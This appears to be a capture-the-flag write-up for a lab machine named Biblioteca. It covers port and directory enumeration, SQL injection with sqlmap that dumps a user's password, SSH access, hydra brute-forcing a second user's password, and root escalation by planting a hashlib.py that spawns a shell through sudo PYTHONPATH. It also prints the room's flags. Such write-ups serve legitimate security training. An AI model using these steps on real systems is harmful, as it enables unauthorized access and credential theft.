# Box Name
## Biblioeca

## Overview
---
* [[#Enumeration]]
	#### rustscan, feroxbuster
* [[#Initial Foothold]]
	#### sqlmap, ssh
* [[#Privilege Escalation]]
	#### python library hijacking 
---
## Enumeration
---
### nmap
	- initial scan
```bash
┌──(kn1ght㉿Kali)-[~]
└─$ rustscan -a 10.10.111.54 --ulimit 5000 -- -sCV -oN nmap/initial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.111.54:22
Open 10.10.111.54:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjGXxdFr0mHKml76YqbA09iT/zirMlq63GKdZVLK3ey11u+RmZEpu+4kDoSpTomeHq5PzD2tOvC3xCmfe+r0yJuG+052rgshOHGP5Jsh49ZuOsCNBmf9d5nYQERArUohS+XWk5AzcOAvENMPrN52qZvnZAPBJUR2M3LUtxLeCXd/Pn47rnolC8kSoZnReUHuyDSK6V0KDsgz9gZfsZEasEVFWeQHSeX70stnpRIPEgB523+EjG9VbeBhSVXOaX99RvkwA2EKdX95fAllkmXIwfscKCDcvCKBx2b/64dA2E0tiXx6TTN1rpY47NB1LTHFyEzXhdY04xI4YWGR0OdlHiF22qTxZ40WNQSP1dfazgpEzXm6tpGD7dE9Ko+fgAy+6wCWOuw2rQVefv/hheU8idtl8S+A4LC9NupPmDFf28GVpMFkMry2/yjD7e8Z1Vl3ZBp/BO0IVUnm/fFrGBEJ2e0RJEzI0lWXbytFNZkCLAZt+8IQLsvPep80zxKM9Jlps=
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk6WcGKOLXNfFSm4hmo/IJAB/aFJ8ZihzQUm796VuMqs4aIusn5+Lu0C8pv8XB22fwBS8XuB6l9LjTo10CFmoQ=
|   256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsjiudT4XOiE2akDRkCkDkhVRMB7oIVMpgkeM63BmO
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
	  
	- allports scan
```bash
┌──(kn1ght㉿Kali)-[~]
└─$ rustscan -a 10.10.111.54 --ulimit 5000 -- -sCV -oN nmap/initial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.111.54:22
Open 10.10.111.54:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:0b:f9:bf:1d:49:a6:c3:fa:9c:5e:08:d1:6d:82:02 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjGXxdFr0mHKml76YqbA09iT/zirMlq63GKdZVLK3ey11u+RmZEpu+4kDoSpTomeHq5PzD2tOvC3xCmfe+r0yJuG+052rgshOHGP5Jsh49ZuOsCNBmf9d5nYQERArUohS+XWk5AzcOAvENMPrN52qZvnZAPBJUR2M3LUtxLeCXd/Pn47rnolC8kSoZnReUHuyDSK6V0KDsgz9gZfsZEasEVFWeQHSeX70stnpRIPEgB523+EjG9VbeBhSVXOaX99RvkwA2EKdX95fAllkmXIwfscKCDcvCKBx2b/64dA2E0tiXx6TTN1rpY47NB1LTHFyEzXhdY04xI4YWGR0OdlHiF22qTxZ40WNQSP1dfazgpEzXm6tpGD7dE9Ko+fgAy+6wCWOuw2rQVefv/hheU8idtl8S+A4LC9NupPmDFf28GVpMFkMry2/yjD7e8Z1Vl3ZBp/BO0IVUnm/fFrGBEJ2e0RJEzI0lWXbytFNZkCLAZt+8IQLsvPep80zxKM9Jlps=
|   256 a1:0c:8e:5d:f0:7f:a5:32:b2:eb:2f:7a:bf:ed:bf:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk6WcGKOLXNfFSm4hmo/IJAB/aFJ8ZihzQUm796VuMqs4aIusn5+Lu0C8pv8XB22fwBS8XuB6l9LjTo10CFmoQ=
|   256 9e:ef:c9:0a:fc:e9:9e:ed:e3:2d:b1:30:b6:5f:d4:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsjiudT4XOiE2akDRkCkDkhVRMB7oIVMpgkeM63BmO
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### ferox

```bash
┌──(kn1ght㉿Kali)-[~/THM/Biblioeca]
└─$ ferox -u http://10.10.111.54:8000 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php,js,cgi -C 403,404 -o logs/ferox

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.111.54:8000
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox
 💲  Extensions            │ [html, txt, php, js, cgi]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
302        4l       24w      218c http://10.10.111.54:8000/logout
200       25l       67w      856c http://10.10.111.54:8000/login
200       26l       76w      964c http://10.10.111.54:8000/register
[####################] - 3m     27966/27966   151/s   http://10.10.111.54:8000

```


---
## Initial Foothold
---
### view web site on port 8000
![[Pasted image 20220522121623.png]]

 - #### playing around with login form  found it to be vulnerable to sqli

![[Pasted image 20220522121814.png]]   ![[Pasted image 20220522121904.png]]
   - #### look like a possible user name of smokey
	   - however the web page did not give me anything useful
  - captured login request in burp and used sqlmap
 ![[Pasted image 20220522124010.png]]

### sqlmap
 - ### ran sqlmap and got user creds
 ```bash
 [12:42:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:42:31] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:42:31] [INFO] fetching current database
[12:42:31] [INFO] fetching tables for database: 'website'
[12:42:31] [INFO] fetching columns for table 'users' in database 'website'
[12:42:32] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+


 ```

 - ### hint says weak password???
	  ssh is open on port 22 so tried logging into ssh with smokey's creds
```bash
┌──(kn1ght㉿Kali)-[~/THM/Biblioeca]
└─$ ssh smokey@10.10.111.54       
The authenticity of host '10.10.111.54 (10.10.111.54)' can't be established.
ED25519 key fingerprint is SHA256:xpqbWswo65YJezxXRx18Va9jub3YGOEzi9N17Mhy9FE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:33: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.111.54' (ED25519) to the list of known hosts.
smokey@10.10.111.54's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 22 May 2022 05:46:50 PM UTC

  System load:  0.08              Processes:             113
  Usage of /:   58.3% of 9.78GB   Users logged in:       0
  Memory usage: 61%               IPv4 address for eth0: 10.10.111.54
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  7 03:21:42 2021 from 10.0.2.15
smokey@biblioteca:~$ id;ls -la
uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
total 28
drwxr-xr-x 3 smokey smokey 4096 Dec  7 03:17 .
drwxr-xr-x 4 root   root   4096 Dec  7 02:42 ..
lrwxrwxrwx 1 root   root      9 Dec  7 03:17 .bash_history -> /dev/null
-rw-r--r-- 1 smokey smokey  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 smokey smokey 3771 Feb 25  2020 .bashrc
drwx------ 2 smokey smokey 4096 Dec  7 00:21 .cache
lrwxrwxrwx 1 root   root      9 Dec  7 03:17 .mysql_history -> /dev/null
-rw-r--r-- 1 smokey smokey  807 Feb 25  2020 .profile
-rw-rw-r-- 1 smokey smokey   75 Dec  7 00:48 .selected_editor
-rw-r--r-- 1 smokey smokey    0 Dec  7 00:22 .sudo_as_admin_successful
-rw------- 1 smokey smokey    0 Dec  7 03:17 .viminfo
smokey@biblioteca:~$ 

```

 - looking around the file system  found a 2nd user hazel
 ```bash
smokey@biblioteca:~$ id hazel;ls -la ../hazel
uid=1001(hazel) gid=1001(hazel) groups=1001(hazel)
total 32
drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
drwxr-xr-x 4 root  root  4096 Dec  7 02:42 ..
lrwxrwxrwx 1 root  root     9 Dec  7 03:24 .bash_history -> /dev/null
-rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
drwx------ 2 hazel hazel 4096 Dec  7 02:54 .cache
-rw-r----- 1 root  hazel  497 Dec  7 02:53 hasher.py
-rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
-rw-r----- 1 root  hazel   45 Mar  2 03:01 user.txt
-rw------- 1 hazel hazel    0 Dec  7 03:23 .viminfo
smokey@biblioteca:~$ 

 ```

```bash
smokey@biblioteca:~$ id hazel;ls -la ../hazel
uid=1001(hazel) gid=1001(hazel) groups=1001(hazel)
total 32
drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
drwxr-xr-x 4 root  root  4096 Dec  7 02:42 ..
lrwxrwxrwx 1 root  root     9 Dec  7 03:24 .bash_history -> /dev/null
-rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
drwx------ 2 hazel hazel 4096 Dec  7 02:54 .cache
-rw-r----- 1 root  hazel  497 Dec  7 02:53 hasher.py
-rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
-rw-r----- 1 root  hazel   45 Mar  2 03:01 user.txt
-rw------- 1 hazel hazel    0 Dec  7 03:23 .viminfo
smokey@biblioteca:~$ 

```

 - ### remembering the hint of weak password ran hydra on hazel and got her password
 ```bash 
┌──(kn1ght㉿Kali)-[~/THM/Biblioeca]
└─$ hydra -l hazel -P pass.txt ssh://10.10.111.54
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-22 13:00:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task
[DATA] attacking ssh://10.10.111.54:22/
[22][ssh] host: 10.10.111.54   login: hazel   password: hazel
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-22 13:00:39

 ```

 - ### used hazels creds to switch users
 ```bash
smokey@biblioteca:~$ su hazel
Password: 
hazel@biblioteca:/home/smokey$ cd
hazel@biblioteca:~$ sudo -l -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:

Sudoers entry:
    RunAsUsers: root
    Options: setenv, !authenticate
    Commands:
	/usr/bin/python3 /home/hazel/hasher.py
hazel@biblioteca:~$ 
 ```

 - ### checked out hasher.py
```bash
hazel@biblioteca:~$ ls -la hasher.py 
-rw-r----- 1 root hazel 497 Dec  7 02:53 hasher.py


hazel@biblioteca:~$ cat hasher.py 
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()

hazel@biblioteca:~$ 

```

 - ### looks like hasher.py is only writable by root 
 - looking back at the output of sudo -l we see that we have the option of setting an environment variable without authentication as root when we run the hasher.py script

## Privilege Escalation
### python library hijacking
 - first we create our own hashlib.py in the /tmp folder
 ```python
#!/usr/bin/env python3

import os

os.system("/bin/bash")
~                                                                                                                                                                                                                                          
  
 ```

  - then we run the file while adding a new PYTHONPATH environment veritable
  ```bash
hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
root@biblioteca:/tmp# id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@biblioteca:/tmp#
  
  ```  

### user.txt
```bash
root@biblioteca:/tmp# cat /home/hazel/user.txt 
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
root@biblioteca:/tmp# 

```
### root.txt
```bash
root@biblioteca:/tmp# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}
root@biblioteca:/tmp# 

```

